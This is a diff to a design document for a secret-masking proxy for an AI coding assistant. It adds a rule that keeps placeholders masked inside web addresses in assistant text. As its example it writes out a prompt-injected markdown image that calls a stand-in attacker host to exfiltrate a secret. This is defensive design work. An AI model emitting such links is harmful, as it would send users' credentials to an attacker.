@@ -107,7 +107,7 @@ Every sensitive value becomes a deterministic placeholder, so the same secret al
 
 | Where the placeholder appears | v1 default |
 | --- | --- |
-| Assistant text | Restore |
+| Assistant text | Restore, except inside an http(s) address (Nov 2, 2026) |
 | `thinking` blocks | Keep placeholder (signed; must be resent unchanged) |
 | `tool_use` input for Edit, Write, MultiEdit, NotebookEdit | Restore |
 | `tool_use` input for Bash | Restore (open question below) |
@@ -115,6 +115,8 @@ Every sensitive value becomes a deterministic placeholder, so the same secret al
 | `tool_use` input for every MCP tool (`mcp__*`) | "own": a value restored only if that server's own results held it (each value notes the servers whose tool results it was masked in, in memory only). A list of types adds values of those types from anywhere |
 
 The policy lives in config (`[restore]` per tool name; the longest matching prefix decides), so it can be tightened without code changes. For any tool not set to "restore", three rules hold whatever the setting: a SECRET is never restored; more than 5 values in one call means none are; and while a server's tool definitions (name, description, input schema, hashed) differ from the ones first seen or last trusted (`keepmum tools trust`), it gets placeholders only. A tool first seen later is trusted as it appears, since Claude Code loads deferred tools one at a time. The servers seen, those hashes, and per day the calls that kept a type a setting could let through are in `~/.config/keepmum/tools.json` (0600), shared by every keepmum process under a file lock.
+
+Assistant text is shown, and a client that renders it fetches what it points at: an image loads by itself, a link on a click, a link preview in the background. So a placeholder inside a web address in the text stays a placeholder, or a prompt-injected `![](https://attacker.example/?k=KEEPMUM_…)` would send the real value there. The run of text since the last whitespace decides: it is an address when it holds `http://`, `https://` or a protocol-relative `//host` after `(`, `[`, `<`, a quote or `=`. Streams carry that run from one delta to the next, so an address split across deltas is still one. Other schemes are restored (`postgres://user:…@host`): no renderer fetches them. The audit entry counts the kept ones per type (`in_urls`), never the values.
 
 **Streaming (the tricky part)**
 
